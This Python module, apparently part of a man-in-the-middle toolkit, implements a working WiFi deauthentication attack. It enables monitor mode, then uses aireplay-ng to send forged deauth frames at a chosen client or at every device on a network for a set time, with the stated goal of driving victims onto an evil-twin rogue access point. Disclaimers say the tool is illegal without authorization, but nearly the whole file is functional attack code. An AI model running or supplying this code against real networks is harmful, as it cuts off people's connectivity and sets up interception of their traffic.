"""
WiFi Deauthentication Attack for MITM-INTERCEPT Phase 1B.

Sends deauth frames to force devices to disconnect from their WiFi network.
Combined with rogue AP, forces devices to reconnect to our evil twin.

⚠️ ILLEGAL WITHOUT AUTHORIZATION — See README.md for legal disclaimer.
"""
import subprocess
import logging
import time
from typing import Optional

logger = logging.getLogger(__name__)


class WiFiDeauthAttacker:
    """
    Performs WiFi deauthentication attacks.

    Sends forged deauth frames to disconnect devices from their network,
    forcing them to reconnect (ideally to our rogue AP).

    ⚠️ WARNING: Deauthentication attacks are illegal without explicit
    authorization. Only use on networks/devices you own or are authorized
    to test. This disrupts legitimate WiFi connectivity and can cause
    significant harm.
    """

    def __init__(self, interface: str):
        """
        Initialize deauth attacker.

        Args:
            interface: WiFi interface to use (must support monitor mode)
        """
        self.interface = interface
        self._monitor_mode_active = False

    def _enable_monitor_mode(self) -> bool:
        """Enable monitor mode on the interface."""
        try:
            # Kill interfering processes
            subprocess.run(
                ["sudo", "airmon-ng", "check", "kill"],
                capture_output=True,
                check=False
            )
            time.sleep(1)

            # Enable monitor mode
            subprocess.run(
                ["sudo", "iwconfig", self.interface, "mode", "monitor"],
                capture_output=True,
                check=True
            )

            time.sleep(1)
            logger.info(f"Monitor mode enabled on {self.interface}")
            self._monitor_mode_active = True
            return True

        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            return False

    def _disable_monitor_mode(self) -> bool:
        """Disable monitor mode on the interface."""
        try:
            subprocess.run(
                ["sudo", "iwconfig", self.interface, "mode", "managed"],
                capture_output=True,
                check=False
            )
            logger.info(f"Monitor mode disabled on {self.interface}")
            self._monitor_mode_active = False
            return True
        except Exception as e:
            logger.warning(f"Failed to disable monitor mode: {e}")
            return False

    def deauth_device(
        self,
        target_mac: str,
        gateway_mac: str,
        ssid: str = "",
        count: int = 10,
        interval: int = 1
    ) -> bool:
        """
        Send deauth frames to a specific device.

        Args:
            target_mac: MAC address of device to deauth
            gateway_mac: MAC address of WiFi router
            ssid: Network name (for logging)
            count: Number of deauth frames to send
            interval: Delay between frames (seconds)

        Returns:
            True if deauth frames were sent
        """
        if not self._monitor_mode_active:
            if not self._enable_monitor_mode():
                return False

        try:
            logger.warning(f"🔴 Sending {count} deauth frames to {target_mac}")
            logger.warning(f"   SSID: {ssid}")
            logger.warning(f"   This will disconnect the device from {ssid}")

            for i in range(count):
                # Send deauth from AP to client
                subprocess.run(
                    [
                        "sudo", "aireplay-ng",
                        "--deauth", "1",
                        "-a", gateway_mac,
                        "-c", target_mac,
                        self.interface
                    ],
                    capture_output=True,
                    check=False
                )

                # Send deauth from client to AP
                subprocess.run(
                    [
                        "sudo", "aireplay-ng",
                        "--deauth", "1",
                        "-a", gateway_mac,
                        self.interface
                    ],
                    capture_output=True,
                    check=False
                )

                if i < count - 1:
                    time.sleep(interval)

            logger.info(f"✅ Deauth frames sent")
            logger.warning(f"⚠️  Device will now search for networks to reconnect")
            logger.warning(f"⚠️  If your rogue AP ({self.interface}) is nearby, device may auto-connect")

            return True

        except Exception as e:
            logger.error(f"Deauth failed: {e}")
            return False

    def deauth_network(
        self,
        gateway_mac: str,
        ssid: str = "",
        duration: int = 60,
        interval: int = 1
    ) -> bool:
        """
        Send continuous deauth frames to all devices on a network.

        Args:
            gateway_mac: MAC address of WiFi router
            ssid: Network name (for logging)
            duration: How long to send deauth frames (seconds)
            interval: Delay between bursts (seconds)

        Returns:
            True if attack was started
        """
        if not self._monitor_mode_active:
            if not self._enable_monitor_mode():
                return False

        try:
            logger.warning(f"🔴 Starting deauth attack on network: {ssid}")
            logger.warning(f"   Gateway MAC: {gateway_mac}")
            logger.warning(f"   Duration: {duration}s")
            logger.warning(f"   ⚠️  ALL devices on this network will be disconnected")

            start_time = time.time()

            while time.time() - start_time < duration:
                # Broadcast deauth (will disconnect all clients)
                subprocess.run(
                    [
                        "sudo", "aireplay-ng",
                        "--deauth", "10",
                        "-a", gateway_mac,
                        self.interface
                    ],
                    capture_output=True,
                    check=False
                )

                elapsed = int(time.time() - start_time)
                remaining = duration - elapsed
                logger.info(f"Deauthing... ({elapsed}s / {duration}s)")

                time.sleep(interval)

            logger.info(f"✅ Deauth attack completed")
            logger.warning(f"⚠️  Devices will now search for networks")

            return True

        except Exception as e:
            logger.error(f"Deauth attack failed: {e}")
            return False

    def stop(self) -> None:
        """Clean up and restore interface."""
        if self._monitor_mode_active:
            self._disable_monitor_mode()


def check_deauth_requirements() -> tuple[bool, str]:
    """
    Check if system has requirements for WiFi deauth attacks.

    Returns:
        (can_run: bool, message: str)
    """
    missing = []

    for cmd in ["airmon-ng", "aireplay-ng", "iwconfig"]:
        try:
            subprocess.run(["which", cmd], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            missing.append(cmd)

    if missing:
        return False, f"Missing: {', '.join(missing)}. Install with: sudo apt-get install aircrack-ng"

    return True, "Deauth attack tools ready"
